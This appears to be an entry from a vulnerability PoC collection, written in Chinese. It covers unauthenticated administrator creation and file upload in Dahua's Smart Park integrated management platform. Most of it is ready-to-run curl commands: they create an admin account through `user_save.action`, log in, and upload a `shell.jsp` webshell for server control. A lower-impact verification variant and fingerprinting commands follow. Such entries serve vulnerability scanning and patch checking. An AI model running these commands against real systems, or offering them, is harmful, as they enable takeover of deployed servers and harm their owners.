---
id: DAHUA-SMART-PARK-UPLOAD
title: 大华智慧园区综合管理平台 user_save.action 未授权用户创建及文件上传漏洞
product: dahua
vendor: Dahua (大华)
version_affected: "大华智慧园区综合管理平台（受影响版本）"
severity: CRITICAL
tags: [file_upload, auth_bypass, 无需认证, 国产]
fingerprint: ["大华", "Dahua", "智慧园区"]
---

## 漏洞描述

大华智慧园区综合管理平台的 `user_save.action` 接口未进行身份认证校验，攻击者可直接调用该接口创建具有管理员权限的用户。创建管理员账户后可登录后台，进一步利用文件上传功能上传 Webshell，获取服务器控制权限。

## 影响版本

- 大华智慧园区综合管理平台（受影响版本）

## 前置条件

- 无需认证
- 目标 HTTP 端口可访问
- `/admin/user_save.action` 接口可达

## 利用步骤

1. 确认目标为大华智慧园区综合管理平台
2. 通过 `/admin/user_save.action` 接口创建管理员用户，设置 `userBean.roleIds=1` 赋予管理员权限
3. 使用创建的管理员账户登录后台
4. 利用后台文件上传功能上传 Webshell
5. 访问 Webshell 获取服务器控制权限

## Payload

### 创建管理员用户

```bash
curl -X POST "http://target/admin/user_save.action" \
  -H "Content-Type: multipart/form-data" \
  -F "userBean.userType=0" \
  -F "userBean.ownerCode=001" \
  -F "userBean.isReuse=0" \
  -F "userBean.macStat=0" \
  -F "userBean.roleIds=1" \
  -F "userBean.loginName=pwned" \
  -F "displayedOrgName=pwned" \
  -F "userBean.loginPass=pwned123" \
  -F "checkPass=pwned123" \
  -F "userBean.groupId=0" \
  -F "userBean.userName=pwned"
```

### 使用创建的用户登录

```bash
curl -X POST "http://target/admin/login.action" \
  -d "loginName=pwned&loginPass=pwned123" \
  -c cookies.txt
```

### 利用后台文件上传（登录后）

```bash
curl -X POST "http://target/admin/file_upload.action" \
  -b cookies.txt \
  -F "file=@shell.jsp;type=application/octet-stream"
```

## 验证方法

无损验证：`user_save.action` 以本次请求才用的账号名（如 `pocPOC_TOKEN`）创建普通用户，再看 `login.action` 是否真的发出会话凭据；拿到会话后上传一个纯文本标记文件，GET 回读该串即确认上传通道可用，最后把文件和用户删掉。禁止以「接口返回 200 或 success 字样」当判据。

```bash
# 1. 未授权创建用户（loginName 用本次唯一串，便于判定与清理）
curl -s -X POST "http://target/admin/user_save.action" \
  -H "Content-Type: multipart/form-data" \
  -F "userBean.userType=0" \
  -F "userBean.ownerCode=001" \
  -F "userBean.isReuse=0" \
  -F "userBean.macStat=0" \
  -F "userBean.roleIds=1" \
  -F "userBean.loginName=pocPOC_TOKEN" \
  -F "displayedOrgName=pocPOC_TOKEN" \
  -F "userBean.loginPass=PocPOC_TOKEN123" \
  -F "checkPass=PocPOC_TOKEN123" \
  -F "userBean.groupId=0" \
  -F "userBean.userName=pocPOC_TOKEN"

# 2. 用刚创建的账号登录：成功形态是响应返回登录凭据而非登录页
curl -s -X POST "http://target/admin/login.action" \
  -d "loginName=pocPOC_TOKEN&loginPass=PocPOC_TOKEN123" \
  -c cookies.txt

# 3. 上传无害标记文件并回读
printf 'POC_TOKEN' > poc-POC_TOKEN.txt
curl -s -X POST "http://target/admin/file_upload.action" \
  -b cookies.txt \
  -F "file=@poc-POC_TOKEN.txt;type=text/plain"

# 回读：响应体出现 POC_TOKEN 即上传通道可用
curl -s "http://target/<上传返回的路径>/poc-POC_TOKEN.txt" | grep "POC_TOKEN"

# 清理：删除标记文件与本次创建的账号
```

判据：

- 创建成功：`login.action` 响应出现成功登录字段（token / Set-Cookie 会话）或跳转后台，且该账号名是本次的 `pocPOC_TOKEN`
- 上传成功：GET 回读到本次写入的 `POC_TOKEN` 串

反例：`user_save.action` 返回 200 或含 `success`，但 `login.action` 仍返回登录页 HTML —— 只是接口收了请求，漏洞不成立。

## 指纹确认

```bash
curl -s "http://target/" | grep -i "大华\|Dahua\|智慧园区\|综合管理平台"
curl -s -o /dev/null -w "%{http_code}" "http://target/admin/user_save.action"
```
